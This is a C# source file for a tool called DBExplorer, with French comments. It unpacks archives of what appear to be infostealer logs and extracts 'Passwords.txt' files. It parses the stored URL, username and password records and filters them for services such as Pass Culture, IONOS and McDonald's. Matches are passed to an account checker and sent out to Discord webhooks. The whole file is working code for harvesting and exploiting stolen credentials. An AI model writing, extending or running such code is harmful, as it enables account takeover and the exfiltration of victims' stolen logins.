using System.Text.RegularExpressions;
using Ionic.Zip;
using SharpCompress.Archives;
using SharpCompress.Archives.Rar;
using SharpCompress.Common;
using ColorfulConsole = Colorful.Console;

namespace DBExplorer
{
    public static class DBExplorer
    {
        private static DateTime startTime;

        public static void Run(string downloadPath)
        {
            PrintBanner();
            string folderPath = downloadPath;
            string[] archives = Directory.GetFiles(folderPath, "*.rar")
                                           .Concat(Directory.GetFiles(folderPath, "*.zip"))
                                           .Concat(Directory.GetFiles(folderPath, "*.RAR"))
                                           .Concat(Directory.GetFiles(folderPath, "*.ZIP"))
                                           .ToArray();

            if (archives.Length == 0)
            {
                System.Console.WriteLine("Aucune archive détectée dans le dossier spécifié.");
                return;
            }

            List<string> processedArchives = LoadProcessedArchives();

            foreach (string archivePath in archives)
            {
                string archiveName = Path.GetFileName(archivePath); // Obtenez le nom de l'archive
                Console.ForegroundColor = ConsoleColor.Red;
                System.Console.WriteLine($"Archive détectée: {archiveName}");
                Console.ResetColor();

                startTime = DateTime.Now; // Save the start time before extraction

                string directoryPath = @"dbdtemp";

                if (!Directory.Exists(directoryPath))
                {
                    // If it doesn't exist, create it
                    Directory.CreateDirectory(directoryPath);
                    Console.WriteLine("Création de dbdtemp.");
                }

                try
                {
                    ExtractArchive(archivePath, "dbdtemp");
                }
                catch (FormatException ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Erreur lors de l'extraction de l'archive {archiveName}: {ex.Message}");
                    Console.ResetColor();
                }
                catch (InvalidFormatException ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Erreur lors de l'extraction de l'archive {archiveName}: {ex.Message}");
                    Console.ResetColor();
                }
                catch (System.OverflowException ex)
                {
                    // Handle the exception
                    Console.WriteLine("Une exception de dépassement de capacité s'est produite : " + ex.Message);
                    // You can add further error handling or logging here if needed
                }
                catch (SharpCompress.Common.CryptographicException ex)
                {
                    // Handle the exception
                    Console.WriteLine("Problème concernant l'archive : " + ex.Message);
                    // You can add further error handling or logging here if needed
                } 
                catch (System.IndexOutOfRangeException ex)
                {
                    Console.WriteLine("Problème concernant l'archive : " + ex.Message);
                }
                catch (System.InvalidOperationException ex)
                {
                    Console.WriteLine("Problème concernant l'archive : " + ex.Message);
                }


                var results = FindPasswords();

                foreach (var keyword in DataVortex.keywords.UrlChecker.Keywords.List.Keys)
                {
                    if (results.ContainsKey(keyword) && results[keyword].Count > 0)
                    {
                        if (keyword == "passculture")
                        {
                            DataVortex.keywords.UrlChecker.Keywords.SendToDiscordWebhookPassculture(
                                results[keyword],
                                DataVortex.keywords.UrlChecker.Keywords.List[keyword],
                                archiveName, // Utilisez le nom de l'archive
                                DataVortex.Checker.BirthDate,
                                DataVortex.Checker.Remaining1
                            ).Wait();
                        }
                        else if (keyword == "ionos")
                        {
                            DataVortex.keywords.UrlChecker.Keywords.SendToDiscordWebhookIonos(
                                results[keyword],
                                DataVortex.keywords.UrlChecker.Keywords.List[keyword],
                                archiveName // Utilisez le nom de l'archive
                            ).Wait();
                        }
                        else if (keyword == "mcdo")
                        {
                            DataVortex.keywords.UrlChecker.Keywords.SendToDiscordWebhookMcdo(
                                results[keyword],
                                DataVortex.keywords.UrlChecker.Keywords.List[keyword],
                                archiveName // Utilisez le nom de l'archive
                            ).Wait();
                        }
                    }
                }

                processedArchives.Add(archiveName); // Ajoutez le nom de l'archive à la liste
                File.Delete(archivePath); // Supprimez le fichier d'archive actuellement traité

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Fin de l'archive {archiveName}.");
                Console.ResetColor();
            }

            // Supprimer le contenu du répertoire dbdtemp
            if (Directory.Exists("dbdtemp"))
            {
                DirectoryInfo directory = new DirectoryInfo("dbdtemp");
                foreach (FileInfo file in directory.GetFiles())
                {
                    file.Delete();
                }
                foreach (DirectoryInfo subDirectory in directory.GetDirectories())
                {
                    subDirectory.Delete(true);
                }

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Contenu de dbdtemp supprimé avec succès.");
                Console.ResetColor();
                DBExplorer.Run(downloadPath); // relance au cas où des exceptions ont surgi pendant le téléchargement.
            }
        }

        private static void PrintBanner()
        {
            ColorfulConsole.WriteLine(Figgle.FiggleFonts.Standard.Render("DBExplorer"));
        }

        private static void ExtractArchive(string filename, string output_path)
        {
            if (IsArchiveFile(filename))
            {
                using (var archive = ArchiveFactory.Open(filename))
                {
                    foreach (var entry in archive.Entries)
                    {
                        if (!entry.IsDirectory && (entry.Key.EndsWith("Passwords.txt") || entry.Key.EndsWith("All Passwords.txt")))
                        {
                            string relativePath = entry.Key;
                            string outputPath = Path.GetFullPath(Path.Combine(output_path, relativePath));
                            string outputDirPath = Path.GetDirectoryName(outputPath) ?? Path.Combine(output_path, "default");

                            Directory.CreateDirectory(outputDirPath);
                            entry.WriteToFile(outputPath, new ExtractionOptions { ExtractFullPath = true, Overwrite = true });
                        }
                    }
                }
            }
            else
            {
                ColorfulConsole.WriteLine("Erreur : format d'archive non pris en charge", System.Drawing.Color.Blue);
                Console.ResetColor();
                File.Delete(filename);
            }
        }

        private static bool IsArchiveFile(string filename)
        {
            return ZipFile.IsZipFile(filename) || RarArchive.IsRarFile(filename);
        }

        public static Dictionary<string, List<(string urlOrHost, string username, string password, string app)>> FindPasswords()
        {
            var results = new Dictionary<string, List<(string urlOrHost, string username, string password, string app)>>();
            var directoryPath = "dbdtemp";
            var files = Directory.GetFiles(directoryPath, "Passwords.txt", SearchOption.AllDirectories);

            foreach (var file in files)
            {
                var contents = File.ReadAllText(file);
                var matches = Regex.Matches(contents, @"(URL|Host):\s*(.*?)\nUsername:\s*(.*?)\nPassword:\s*(.*?)\nApplication:\s*(.*?)\n=*");

                foreach (Match match in matches)
                {
                    var urlOrHost = match.Groups[2].Value.Trim();
                    var username = match.Groups[3].Value.Trim();
                    var password = match.Groups[4].Value.Trim();
                    var app = match.Groups[5].Value.Trim();

                    foreach (var keyword in DataVortex.keywords.UrlChecker.Keywords.List.Keys)
                    {
                        if (urlOrHost.Contains(keyword))
                        {
                            var result = (urlOrHost, username, password, app);

                            DataVortex.Checker.HandleAccount(keyword, result);

                            if (!results.ContainsKey(keyword))
                            {
                                results[keyword] = new List<(string urlOrHost, string username, string password, string app)>();
                            }
                            results[keyword].Add(result);
                        }
                    }
                }
            }

            return results;
        }

        public static List<string> LoadProcessedArchives()
        {
            if (File.Exists("processed_archives.txt"))
            {
                return File.ReadAllLines("processed_archives.txt").ToList();
            }
            return new List<string>();
        }
    }
}
